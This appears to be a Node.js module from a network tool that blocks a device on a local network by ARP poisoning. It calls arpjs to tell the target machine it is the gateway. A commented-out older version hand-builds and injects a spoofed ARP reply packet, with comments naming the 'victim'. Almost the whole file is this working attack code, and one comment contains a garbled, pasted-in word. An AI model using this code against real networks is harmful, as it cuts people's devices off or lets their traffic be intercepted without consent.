// const pcap = require('pcap');
const arp = require('arpjs')


const blockHostDevice = (event, arg) => {
  // the new way
  let { netinterface, gatewayip, targetip } = arg;
  console.log(arg)
  // netinterface = JSON.parse(netinterface);
  // gatewayip    = JSON.parse(gatewayip);
  // targetip     = JSON.parse(targetip);

  arp.setInterface(netinterface)
  arp.poison(targetip, gatewayip) // tell target I am gateway

  // the old way:
  /*
    let { netinterface, ourmac, ourip, gatewayip, targetip } = arg;
    //    wlan0 aa:bb:cc:00:00 192.168.0.2 192.168.0.1,
    netinterface = JSON.parse(netinterface);
    ourmac = JSON.parse(ourmac);
    ourip = JSON.parse(ourip);
    gatewayip = JSON.parse(gatewayip);
    targetip  = JSON.parse(targetip);

    var packet = poison_packet(ourmac, ourip, gatewayip, targetip))
    pcap_session = pcap.createSession(netinterface, 'arp');
    pcap_session.inject(packet);
  */
}



module.exports = blockHostDevice;






/* Old way


// Build arpspoof poison packet
//                          ip we tell and convince -------.
//                          ip we want to control --v      v
// poison_packet('11:11:11:11:11:11','1.1.1.1','2.2.2.2','3.3.3.3')
// typically we would tell the gateway we are the victim's ip
//  and tell the victim we are the gateway
function poison_packet(ourmac, ourip, victimip, tellip) {
  // based on https://github.com/skepticfx/arpjs/blob/master/lib/packet.js#L53 (MIT)
  // but here so can make windows compatible and reduce dependencies
  // turn '00:00:00:..' into ['0x00','0x00'] which new Buffer is fine with converting
  if (typeof ourmac === 'string') ourmac = ourmac.split(':').map((x)=>'0x'+x);
  if (typeof ourip === 'string') ourip = ourip.split('.');
  if (typeof victimip === 'string') victimip = victimip.split('.');
  if (typeof tellip === 'string') tellip = tellip.split('.');
  return new Buffer.from([
    // ETHERNET
    // 0    = Destination MAC
    //  pkt.dst = macToArr(pktObj.dst_mac) // tell: 'ff:ff:ff:ff:ff:ff'
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //  broadcast
    // 6    = Source MAC
    // pkt.src = macToArr(macAddr)        // this machines mac
    ourmac[0], ourmac[1], ourmac[2],
    ourmac[3], ourmac[4], ourmac[5],
    0x08, 0x06, // 12   = EtherType = ARP
    // ARP
    0x00, 0x01, // 14/0   = Hardware Type = Ethernet (or wifi)
    0x08, 0x00, // 16/2   = Protocol type = ipv4 (request ipv4 route info)
    0x06, 0x04, // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
    0x00, 0x02, // 20/6   = Operation (ARP, who-has) 01=request,02=reply
    // 22/8   = Sender HardwgetHostsDevicesare Addr (MAC)
    // pkt.src_mac = macToArr(macAddr)        // this machines mac
    ourmac[0], ourmac[1], ourmac[2],
    ourmac[3], ourmac[4], ourmac[5],
    // 28/14  = Sender Protocol address (ipv4)
    // pkt.src_ip = ipToArr(pktObj.src_ip)    // victum: e.g. gw
    victimip[0], victimip[1], victimip[2], victimip[3],
    // 32/18  = Target Hardware Address (Blank/nulls for who-has)
    // pkt.src_ip = ipToArr(pktObj.src_ip)    // victum: e.g. gw
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    // 38/24  = Target Protocol address (ipv4)
    // pkt.dst_ip = ipToArr(pktObj.dst_ip)    // tell: e.g. host
    tellip[0], tellip[1], tellip[2], tellip[3],
  ]);
}

*/